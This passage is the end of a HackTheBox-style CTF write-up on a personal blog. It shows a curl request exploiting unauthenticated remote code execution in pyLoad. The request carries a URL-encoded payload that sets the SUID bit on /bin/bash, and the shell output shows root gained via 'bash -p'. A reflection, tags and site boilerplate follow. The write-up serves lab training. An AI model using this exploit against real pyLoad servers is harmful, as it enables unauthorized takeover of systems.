+    >this report on unauthenticated RCE in pyLoad</a>. Although I wasn&rsquo;t finding an easy way to see pyLoad&rsquo;s version number, the exploit does not seem volitile, and so I gave it a shot. Note that the payload has been altered to be <code>pyimport os;os.system(&quot;chmod +s /bin/bash&quot;)</code>, which is different from the article.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -i -s -k -X <span class="s1">$&#39;POST&#39;</span> -H <span class="s1">$&#39;Host: 127.0.0.1:8000&#39;</span> -H <span class="s1">$&#39;Content-Type: application/x-www-form-urlencoded&#39;</span> -H <span class="s1">$&#39;Content-Length: 184&#39;</span> --data-binary <span class="s1">$&#39;package=xxx&amp;crypted=AAAA&amp;jk=%70%79%69%6d%70%6f%72%74%20%6f%73%3b%6f%73%2e%73%79%73%74%65%6d%28%22%63%68%6d%6f%64%20%2b%73%20%2f%62%69%6e%2f%62%61%73%68%22%29;f=function%20f2(){};&amp;passwords=aaaa&#39;</span> <span class="s1">$&#39;http://127.0.0.1:8000/flash/addcrypted2&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Executing the command as user <code>sau</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sau@pc:/opt/app$ curl -i -s -k -X <span class="s1">$&#39;POST&#39;</span> -H <span class="s1">$&#39;Host: 127.0.0.1:8000&#39;</span> -H <span class="s1">$&#39;Content-Type: application/x-www-form-urlencoded&#39;</span> -H <span class="s1">$&#39;Content-Length: 184&#39;</span> --data-binary <span class="s1">$&#39;package=xxx&amp;crypted=AAAA&amp;jk=%70%79%69%6d%70%6f%72%74%20%6f%73%3b%6f%73%2e%73%79%73%74%65%6d%28%22%63%68%6d%6f%64%20%2b%73%20%2f%62%69%6e%2f%62%61%73%68%22%29;f=function%20f2(){};&amp;passwords=aaaa&#39;</span> <span class="s1">$&#39;http://127.0.0.1:8000/flash/addcrypted2&#39;</span>
+</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">500</span> INTERNAL SERVER ERROR
+</span></span><span class="line"><span class="cl">Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+</span></span><span class="line"><span class="cl">Content-Length: <span class="m">21</span>
+</span></span><span class="line"><span class="cl">Access-Control-Max-Age: <span class="m">1800</span>
+</span></span><span class="line"><span class="cl">Access-Control-Allow-Origin: *
+</span></span><span class="line"><span class="cl">Access-Control-Allow-Methods: OPTIONS, GET, POST
+</span></span><span class="line"><span class="cl">Vary: Accept-Encoding
+</span></span><span class="line"><span class="cl">Date: Thu, <span class="m">05</span> Oct <span class="m">2023</span> 01:35:19 GMT
+</span></span><span class="line"><span class="cl">Server: Cheroot/8.6.0
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Could not decrypt
+</span></span><span class="line"><span class="cl">sau@pc:/opt/app$ bash -p
+</span></span><span class="line"><span class="cl">bash-5.0# whoami
+</span></span><span class="line"><span class="cl">root
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Looks like pyLoad is vulnerable, and we are now root!</p>
+<h2 id="reflection">Reflection
+</h2><p>I found this box to be simple and clean, without much distractions. Interacting with gRPC was the biggest challenge, and I still find it annoying that using grpc-cli was so problematic. However, once the worst is passed, exploiting the vulnerabilities was quite stress-free.</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/grpc/">GRPC</a>
+        
+            <a href="/tags/postman/">Postman</a>
+        
+            <a href="/tags/sqlite/">SQLite</a>
+        
+            <a href="/tags/sql-injection/">SQL Injection</a>
+        
+            <a href="/tags/pyload/">PyLoad</a>
+        
+            <a href="/tags/csrf/">CSRF</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-drive/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-drive/Drive.0a2a46fe54b3fb58a269f4b35b5ab403_hu7481452741760639705.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Drive"
+                        
+                        data-hash="md5-CipG/lSz&#43;1iiafSzW1q0Aw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Drive</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-devvortex/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-devvortex/Devvortex.61ba3466bff8da52f89d2bb6417fb83a_hu4257021157125360887.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Devvortex"
+                        
+                        data-hash="md5-Ybo0Zr/42lL4nSu2QX&#43;4Og==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Devvortex</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-surveillance/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-surveillance/Surveillance.8b9fd8fd814572f9ed8f343a005ca93c_hu1936471103572467903.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Surveillance"
+                        
+                        data-hash="md5-i5/Y/YFFcvntjzQ6AFypPA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Surveillance</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-hospital/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-hospital/Hospital.dd28dc96da49df800b952a77639d4857_hu7748615803054416032.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Hospital"
+                        
+                        data-hash="md5-3SjcltpJ34ALlSp3Y51IVw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Hospital</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-codify/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-codify/Codify.d19bf609d86d6ee490cdde52cb652366_hu5530218627868483871.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Codify"
+                        
+                        data-hash="md5-0Zv2CdhtbuSQzd5Sy2UjZg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Codify</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2024 Spencer&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.799eb5847effe83ae252baf7b2236f0c3752b0188dd0985faa7efc75ea805b29.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
